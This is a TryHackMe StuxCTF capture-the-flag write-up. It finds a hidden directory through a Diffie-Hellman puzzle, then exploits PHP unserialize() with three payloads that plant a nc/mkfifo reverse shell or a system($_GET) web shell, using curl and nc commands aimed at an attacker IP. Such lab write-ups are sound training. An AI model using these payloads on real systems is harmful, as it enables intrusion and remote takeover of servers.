# 28 - StuxCTF - PHP Deserialization

Room Link --> [https://tryhackme.com/room/stuxctf](https://tryhackme.com/room/stuxctf)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -sS -Pn -n -T5 -p- -vv 10.10.62.204

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```
{% endcode %}

We checked "robots.txt", and found:

<figure><img src=".gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

We checked the "/StuxCTF" dir, but we hit a dead end now and gobuster didn’t return any  directory. So, let’s backtrack and check the source code on the main page.

#### Opening the WebSite source code and found:

<figure><img src=".gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Diffie Hellman.
p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
g: 7;
a: 330;
b: 450;
g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
```
{% endcode %}

Using this [video](https://www.youtube.com/watch?v=M-0qt6tdHzk) we can decrypt and get the hidden directory.

Python script to find the hidden directory.

{% code overflow="wrap" lineNumbers="true" %}
```bash
import math
 
c = 0
p = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251
g = 7
a = 330
b = 450
gc = 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617
 
gca = (gc**a) % p
gcab = (gca**b) % p
 
print(str(gcab)[:128])

# hidden dir
47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
```
{% endcode %}

Navigating to the hidden directory:

<figure><img src=".gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

The hint "?file=" suggest a possiblle cmd injection, trying to view the "/etc/paasswd" file didn't work. But the default "index.php" outputed something to the screen.

<figure><img src=".gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

Using Cyberchef to decode it, and got a base64 text in reverse format.

<figure><img src=".gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

I used some online text reverser to reverse it.

{% code overflow="wrap" lineNumbers="true" %}
```bash
PGJyIC8+CmVycm9yX3JlcG9ydGluZygwKTs8YnIgLz4KY2xhc3MgZmlsZSB7PGJyIC8+CiAgICAgICAgcHVibGljICRmaWxlID0gImR1bXAudHh0Ijs8YnIgLz4KICAgICAgICBwdWJsaWMgJGRhdGEgPSAiZHVtcCB0ZXN0Ijs8YnIgLz4KICAgICAgICBmdW5jdGlvbiBfX2Rlc3RydWN0KCl7PGJyIC8+CiAgICAgICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkdGhpcy0+ZmlsZSwgJHRoaXMtPmRhdGEpOzxiciAvPgogICAgICAgIH08YnIgLz4KfTxiciAvPgo8YnIgLz4KPGJyIC8+CiRmaWxlX25hbWUgPSAkX0dFVFsnZmlsZSddOzxiciAvPgppZihpc3NldCgkZmlsZV9uYW1lKSAmJiAhZmlsZV9leGlzdHMoJGZpbGVfbmFtZSkpezxiciAvPgogICAgICAgIGVjaG8gIkZpbGUgbm8gRXhpc3QhIjs8YnIgLz4KfTxiciAvPgo8YnIgLz4KaWYoJGZpbGVfbmFtZT09ImluZGV4LnBocCIpezxiciAvPgogICAgICAgICRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGVfbmFtZSk7PGJyIC8+CiAgICAgICAgJHRhZ3MgPSBhcnJheSgiIiwgIiIpOzxiciAvPgogICAgICAgIGVjaG8gYmluMmhleChzdHJyZXYoYmFzZTY0X2VuY29kZShubDJicihzdHJfcmVwbGFjZSgkdGFncywgIiIsICRjb250ZW50KSkpKSk7PGJyIC8+Cn08YnIgLz4KdW5zZXJpYWxpemUoZmlsZV9nZXRfY29udGVudHMoJGZpbGVfbmFtZSkpOzxiciAvPgo8YnIgLz4KPCFET0NUWVBFIGh0bWw+PGJyIC8+CiAgICA8aGVhZD48YnIgLz4KICAgICAgICA8dGl0bGU+U3R1eENURjwvdGl0bGU+PGJyIC8+Cgk8bWV0YSBjaGFyc2V0PSJVVEYtOCI+PGJyIC8+CiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj48YnIgLz4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImFzc2V0cy9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIC8+PGJyIC8+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJhc3NldHMvY3NzL3N0eWxlLmNzcyIgLz48YnIgLz4KICAgIDwvaGVhZD48YnIgLz4KICAgICAgICA8Ym9keT48YnIgLz4KICAgICAgICA8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWRlZmF1bHQgbmF2YmFyLWZpeGVkLXRvcCI+PGJyIC8+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPjxiciAvPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJuYXZiYXItaGVhZGVyIj48YnIgLz4KICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9Im5hdmJhci10b2dnbGUgY29sbGFwc2VkIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyIiBhcmlhLWV4cGFuZGVkPSJmYWxzZSIgYXJpYS1jb250cm9scz0ibmF2YmFyIj48YnIgLz4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJzci1vbmx5Ij5Ub2dnbGUgbmF2aWdhdGlvbjwvc3Bhbj48YnIgLz4KICAgICAgICAgICAgICA8L2J1dHRvbj48YnIgLz4KICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSJpbmRleC5waHAiPkhvbWU8L2E+PGJyIC8+CiAgICAgICAgICAgIDwvZGl2PjxiciAvPgogICAgICAgICAgPC9kaXY+PGJyIC8+CiAgICAgICAgPC9uYXY+PGJyIC8+CiAgICAgICAgPCEtLSBoaW50OiAvP2ZpbGU9IC0tPjxiciAvPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+PGJyIC8+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9Imp1bWJvdHJvbiI+PGJyIC8+CgkJCQk8Y2VudGVyPjxiciAvPgoJCQkJCTxoMT5Gb2xsb3cgdGhlIHdoaXRlIHJhYmJpdC4uPC9oMT48YnIgLz4KCQkJCTwvY2VudGVyPjxiciAvPgogICAgICAgICAgICA8L2Rpdj48YnIgLz4KICAgICAgICA8L2Rpdj4gICAgICAgICAgICA8YnIgLz4KICAgICAgICA8c2NyaXB0IHNyYz0iYXNzZXRzL2pzL2pxdWVyeS0xLjExLjMubWluLmpzIj48L3NjcmlwdD48YnIgLz4KICAgICAgICA8c2NyaXB0IHNyYz0iYXNzZXRzL2pzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PjxiciAvPgogICAgPC9ib2R5PjxiciAvPgo8L2h0bWw+PGJyIC8+Cg==
```
{% endcode %}

Decoding it is easy.

{% code overflow="wrap" lineNumbers="true" %}
```php
<br />
error_reporting(0);<br />
class file {<br />
        public $file = "dump.txt";<br />
        public $data = "dump test";<br />
        function __destruct(){<br />
                file_put_contents($this->file, $this->data);<br />
        }<br />
}<br />
<br />
<br />
$file_name = $_GET['file'];<br />
if(isset($file_name) && !file_exists($file_name)){<br />
        echo "File no Exist!";<br />
}<br />
<br />
if($file_name=="index.php"){<br />
        $content = file_get_contents($file_name);<br />
        $tags = array("", "");<br />
        echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));<br />
}<br />
unserialize(file_get_contents($file_name));<br />
<br />
<!DOCTYPE html><br />
    <head><br />
        <title>StuxCTF</title><br />
	<meta charset="UTF-8"><br />
        <meta name="viewport" content="width=device-width, initial-scale=1"><br />
        <link rel="stylesheet" href="assets/css/bootstrap.min.css" /><br />
        <link rel="stylesheet" href="assets/css/style.css" /><br />
    </head><br />
        <body><br />
        <nav class="navbar navbar-default navbar-fixed-top"><br />
          <div class="container"><br />
            <div class="navbar-header"><br />
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"><br />
                <span class="sr-only">Toggle navigation</span><br />
              </button><br />
              <a class="navbar-brand" href="index.php">Home</a><br />
            </div><br />
          </div><br />
        </nav><br />
        <!-- hint: /?file= --><br />
        <div class="container"><br />
            <div class="jumbotron"><br />
				<center><br />
					<h1>Follow the white rabbit..</h1><br />
				</center><br />
            </div><br />
        </div>            <br />
        <script src="assets/js/jquery-1.11.3.min.js"></script><br />
        <script src="assets/js/bootstrap.min.js"></script><br />
    </body><br />
</html><br />

```
{% endcode %}

And looking at the decoded "index.php" file we see the "unserialize" function:

`unserialize(file_get_contents($file_name));`: This line attempts to unserialize the contents of the file specified by `$file_name` using `unserialize()`.

### PHP Serialization Vulnerability <a href="#4-php-serialize-vulnerability" id="4-php-serialize-vulnerability"></a>

Google search `PHP unserialize exploit to RCE` , found many blog posts that explains this vulnerability so i used this [one](https://notsosecure.com/remote-code-execution-php-unserialize)

{% code title="shell.php" overflow="wrap" lineNumbers="true" %}
```php
# 1st php payload.
<?php
class file 
{
	public $file = 'shell.php';
	public $data = "<?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 4444 >/tmp/f') ?>";
}

$serial = serialize(new file);
print $serial;
print("\n");
?>
# php shell.php > shell.txt # serialized data is stored in shell.txt

# --------------------------------------------------------
# or
# --------------------------------------------------------
# 2nd php payload.
# this saves the file into the "assets" directory.
<?php
class file 
{
	public $file = 'assets/shell.php';
	public $data = "<?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 4444 >/tmp/f') ?>";
}

$serial = serialize(new file);
print $serial;
print("\n");
?>

$obj = new file;
echo serialize($obj);
?>
# php shell.php > shell.txt # serialized data is stored in shell.txt

# --------------------------------------------------------
# or
# --------------------------------------------------------
# 3rd php payload.
# for cmd execution (web shell code).
<?php
class file {
        public $file = "shell.php";
        public $data = '<?php system($_GET["cmd"])?>';
        function __destruct(){
                file_put_contents($this->file, $this->data);
        }
}

$obj = new file;
echo serialize($obj);
?>
# php shell.php > webshell.txt # serialized data is stored in webshell.txt

```
{% endcode %}

Then we setup python simple webserver.

```bash
python3 -m http.server 80
```

Finally, use the `?file=` parameter to read our evil serialized PHP object remotely, which will then write a parsed to `__destruct()` magic method, and write our PHP webshell to disk.

#### Upload the "shell.txt" to the webserver.

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://10.10.62.204/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/?file=http://10.18.88.214/shell.txt"

# for payload 3.
# we can use curl.
curl -s http://10.10.127.170/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/ --get --data-urlencode "file=http://10.18.88.214/webshell.txt"

```
{% endcode %}

<figure><img src=".gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

#### Trigerring the payload:

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://10.10.62.204/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/shell.php
```
{% endcode %}

Or if we used the 2nd php payload and uploaded to the "assets" directory: the file would be uploaded there.

<figure><img src=".gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

And we get a shell.

<figure><img src=".gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

For Payload 3:

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we have code execution on the web now.
curl -s http://10.10.127.170/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/shell.php --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# for rev shell.
curl -s http://10.10.127.170/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/shell.php --get --data-urlencode "cmd=/bin/nc 10.18.88.214 4444 -e /bin/sh"

# make sure nc is listening.
nc -nvlp 4444
# and we got a shell.
┌──(dking㉿dking)-[~/Downloads]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.18.88.214] from (UNKNOWN) [10.10.127.170] 33732

```
{% endcode %}



### Priv Esc

`sudo -l` - we can execute all cmds as root user.

`sudo su` - and we are root.

Done!

